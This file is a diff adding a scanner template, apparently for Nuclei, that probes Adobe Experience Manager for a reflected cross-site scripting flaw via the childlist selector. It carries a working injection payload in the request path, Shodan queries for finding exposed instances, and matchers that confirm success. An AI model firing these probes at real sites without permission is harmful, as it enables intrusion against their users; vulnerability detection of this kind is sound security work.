@@ -1,0 +1,54 @@
+id: aem-xss-childlist
+
+info:
+  name: Adobe Experience Manager Childlist Selector - Cross-Site Scripting
+  author: theabhinavgaur
+  severity: medium
+  description: |
+    Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the childlist selector when a dispatcher does not respect the content type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query:
+      - http.title:"AEM Sign In"
+      - http.component:"Adobe Experience Manager"
+    product: experience_manager
+    vendor: adobe
+  tags: xss,aem,adobe,misconfig
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html"
+      - "{{BaseURL}}/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src="x" data onerror="alert(domain)"/>'
+          - '<br /><br />please authenticate<br /><br />'
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - 'data-coral-columnview-id'
+
+      - type: word
+        part: content_type
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100c1545a2e7b9daca65a50c93484fd1e61b289e9114e208f36edb1617125466016022100a7af16e42ce8740fbfbcabf0825a13c58ec42491bf828de93874811d9380ab49:922c64590222798bb761d5b6d8e72950
